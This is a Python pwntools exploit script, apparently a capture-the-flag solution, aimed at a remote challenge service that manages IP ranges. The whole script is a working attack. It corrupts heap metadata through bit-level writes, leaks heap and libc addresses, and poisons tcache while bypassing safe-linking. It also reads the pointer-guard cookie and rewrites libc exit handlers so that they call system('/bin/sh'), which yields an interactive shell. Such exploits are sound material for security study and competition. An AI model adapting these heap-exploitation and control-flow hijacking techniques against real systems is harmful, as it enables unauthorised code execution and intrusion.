from pwn import *
import builtins

file = ELF("./pwn")
libc = ELF("./libc.so.6")

context.binary = file
context.terminal = ["kitty"]

script = """
b main
b alarm
b _exit
c
set $rdi = 0xffffffff
# brva 0x000015e6
code
c
"""

BUFFERING = True
buffer = b""
recvs = []
recvbuffer = b""
def flush():
    global buffer, recvs, recvbuffer
    p.send(buffer)

    recvbuffer = b""
    for recv in recvs + [b"1."]:
        recvbuffer += p.recvuntil(recv)
    buffer = b""
    recvs = []

def send(after: bytes, val, line: bool = False):
    global buffer
    match type(val):
        case builtins.str | builtins.int:
            val = f"{val}".encode()
        case builtins.bytes:
            pass

    if line: val += b"\n"
    if BUFFERING:
        # log.info(f"buffering {val}")
        buffer += val
        recvs.append(after)
    else:
        p.sendafter(after, val)

def create(start: int, end: int):
    sendline(b":", b"1".ljust(0xf-1, b"\0"))
    sendline(b":", fmtip(start).encode().ljust(0x1f-1, b"\0"))
    sendline(b":", fmtip(end).encode().ljust(0x1f-1, b"\0"))

def delete():
    sendline(b":", b"5".ljust(0xf-1, b"\0"))

resps = []
def handle_buffered_queries():
    global resps
    n = 0
    offset = 0
    for i, resp in enumerate(resps):
        idx = recvbuffer.find(b" in the set", offset)
        if idx == -1:
            break
        if recvbuffer[idx-3:idx] != b"not":
            n |= (1 << i)
        offset = idx + 1
    return n

def query(ip: int):
    global resps
    sendline(b":", b"4".ljust(0xf-1, b"\0"))
    sendline(b":", fmtip(ip).encode().ljust(0x1f-1, b"\0"))
    if BUFFERING:
        resps.append(0)
    else:
        resp = p.recvline()
        return b"is in the set" in resp

def add(ip: str):
    sendline(b":", b"2".ljust(0xf-1, b"\0"))
    sendline(b":", ip.encode().ljust(0x2f-1, b"\0"))

def rem(ip: str):
    sendline(b":", b"3".ljust(0xf-1, b"\0"))
    sendline(b":", ip.encode().ljust(0x2f-1, b"\0"))

def fmtip(ip: int):
    parts = [(ip >> (24 - i * 8) & 0xff) for i in range(4)]
    return ".".join(map(str, parts))

def parseip(ip: str):
    parts = list(map(int, ip.split(".")))
    n = 0
    for i, part in enumerate(parts):
        n |= part << ((3 - i) * 8)
    return n

def sendline(after: bytes, val):
    send(after, val, line=True)

def edit(start: int, payload: bytes):
    rem(fmtip(start) + "-" + fmtip(start + len(payload) * 8))
    for off, byte in enumerate(payload):
        for i in range(8):
            if (byte >> i) & 1:
                ip = fmtip(start + off * 8 + i)
                add(ip)

def write(offset: int, val: int):
    delta = 0
    bits = 7
    prev = None
    for i in range(10):
        if (val >> i) & 1 == prev:
            continue

        prev = (val >> i) & 1

        # log.info(f"{delta = :#x}")
        target = 0x10000000

        while True:
            start = target + offset * 8 + delta * 8 + 7 - i
            if start < target + (1 << bits):
                break
            bits += 1

        end = target + (1 << bits) - 1
        # log.info(f"{bits = :#x}, {target = :#x}, {start = :#x}, {end = :#x}")
        o = (target - start + 7) // 8
        log.info(f"writing to {o:#x}")
        create(start, end)

        size = (end - start) // 8 + 1
        alloc = max(0x20, (size + 15) & ~15)
        log.info(f"{alloc = :#x}")
        delta += alloc

        ip = fmtip(start) + f"/{32 - bits}"
        if (val >> i) & 1:
            add(ip)
        else:
            rem(ip)

if args.LOCAL:
    p = remote("localhost", 5000)
    p.recv(1)
    pid = int(subprocess.check_output("pgrep -f /app/run", shell=True), 0)
    gdb.attach(pid, gdbscript="b exit\nc", exe="./patch")
elif args.REMOTE:
    p = process("nc -X connect -x instance.penguin.0ops.sjtu.cn:18081 3fm2kbcqxbq47p29 1", shell=True)
else:
    p = gdb.debug("./patch", gdbscript = script)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x207 * 8)
delete()
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x407 * 8)
delete()

start = parseip("1.1.1.1")
end = start + 0x4f7 * 8
create(start, end)
fake = p64(0) + p64(0x421)
fake = fake.ljust(0x420, b"\x00")
fake += p64(0x421)
fake += p64(0x21)
fake += p64(0) * 3
fake += p64(0x21)
edit(start, fake)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x207 * 8)
flush()

leak = 0
for i in range(64):
    if query(start + i):
        leak |= (1 << i)
flush()
leak = handle_buffered_queries()
heapbase = leak << 12

print(f"{leak = :#x}")
print(f"{heapbase = :#x}")

### part1

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
delete()
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x17 * 8)
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
delete()
write(0x38 + 0x20 + 0x40, 0x80>>1)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
delete()
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)

offset = 0x50
payload = b"\x00" * (offset - 8) + p64(0x61) + p64(0)
edit(parseip("1.1.1.1"), payload)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
delete()

### part 2

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
delete()
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x17 * 8)
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
delete()
write(0x38 + 0x20 + 0x40, 0x80>>1)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
delete()
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)

offset = 0x50
fakeaddr = heapbase + 0x8d0
location = heapbase + 0x1210
mangled = (fakeaddr ^ (location >> 12))
log.info(f"{mangled = :#x}")
payload = b"\x00" * (offset - 8) + p64(0x61)
edit(parseip("1.1.1.1"), payload)
delete()

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
delete()

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)
payload = b"\x00" * (offset - 8) + p64(0x61) + p64(mangled) + p64(0x07)
edit(parseip("1.1.1.1"), payload)

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x57 * 8)
create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x57 * 8)
delete()

create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x417 * 8)

leak = 0
for i in range(64):
    if query(parseip("1.1.1.1") + i):
        leak |= (1 << i)
flush()
leak = handle_buffered_queries()

log.info(f"{leak = :#x}")
libcbase = leak - 0x21ace0
log.info(f"{libcbase = :#x}")

def arbitrary(addr: int, loc: int = None):
    log.info(f"writing to {addr:#x}")
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
    delete()
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x17 * 8)
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
    delete()
    write(0x38 + 0x20 + 0x40, 0x80>>1)

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
    delete()
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)

    offset = 0x50
    payload = b"\x00" * (offset - 8) + p64(0x61) + p64(0)
    edit(parseip("1.1.1.1"), payload)

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
    delete()

    ### part 2

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
    delete()
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x17 * 8)
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
    delete()
    write(0x38 + 0x20 + 0x40, 0x80>>1)

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x27 * 8)
    delete()
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)

    offset = 0x50
    fakeaddr = addr
    location = heapbase + (loc or 0)
    mangled = (fakeaddr ^ (location >> 12))
    log.info(f"{mangled = :#x}")
    payload = b"\x00" * (offset - 8) + p64(0x61)
    edit(parseip("1.1.1.1"), payload)
    delete()

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x37 * 8)
    delete()

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x77 * 8)
    payload = b"\x00" * (offset - 8) + p64(0x61) + p64(mangled) + p64(0x07)
    edit(parseip("1.1.1.1"), payload)

    if loc is None:
        pause()

    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x57 * 8)
    create(parseip("1.1.1.1"), parseip("1.1.1.1") + 0x57 * 8)

libc.address = libcbase
log.info(f"{libc.sym.global_libgcc_handle = :#x}")
log.info(f"{libc.sym.__libc_single_threaded = :#x}")
_global = libcbase + 0x2224e0
log.info(f"{_global = :#x}")

tls = libcbase - 0x28c0
arbitrary(tls + 0x30, 0x1000)
flush()

leak = 0
for i in range(64):
    if query(parseip("1.1.1.1") + i):
        leak |= (1 << i)
flush()
cookie = handle_buffered_queries()
log.info(f"{cookie = :#x}")

arbitrary(libc.sym.global_libgcc_handle - 8, 0x2000)
edit(parseip("1.1.1.1"), p64(0) + p8(1))

arbitrary(_global, 0x2000)
mangled = libc.sym.exit
mangled ^= cookie
mangled = ((mangled << 17) | (mangled >> (64 - 17))) % (1 << 64)
log.info(f"{mangled = :#x}")
edit(parseip("1.1.1.1"), p64(0) + p64(mangled))

flush()

arbitrary(tls + 0x300, 0x3000)
edit(parseip("1.1.1.1"), p64(0) + p8(8))

arbitrary(libc.sym.__libc_single_threaded - 8, 0x3000)
edit(parseip("1.1.1.1"), p64(0) + p8(0))

flush()

arbitrary(libc.sym.initial, 0x4000)
system = libc.sym.system
system ^= cookie
system = ((system << 17) | (system >> (64 - 17))) % (1 << 64)
shell = next(libc.search(b"/bin/sh\x00"))
edit(parseip("1.1.1.1"), p64(0) + p64(1) + p64(4) + p64(system) + p64(shell))

arbitrary(tls + 0x10, 0x4000)
edit(parseip("1.1.1.1"), p64(tls))

flush()

BUFFERING = False
add(fmtip(parseip("1.1.1.1") + 8 * 8))

p.interactive()